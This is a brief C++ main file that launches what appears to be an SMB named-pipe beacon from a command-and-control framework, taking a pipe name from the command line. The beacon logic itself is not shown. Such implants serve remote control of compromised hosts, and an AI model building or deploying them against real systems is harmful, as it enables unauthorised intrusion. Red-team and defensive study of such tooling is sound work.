#include "BeaconSmb.hpp"


using namespace std;


int main(int argc, char* argv[])
{	
	std::string pipeName = "mynamedpipe";
	if(argc > 1)
		pipeName = argv[1];

	std::unique_ptr<Beacon> beacon;
	beacon = make_unique<BeaconSmb>(pipeName);

	beacon->run();
}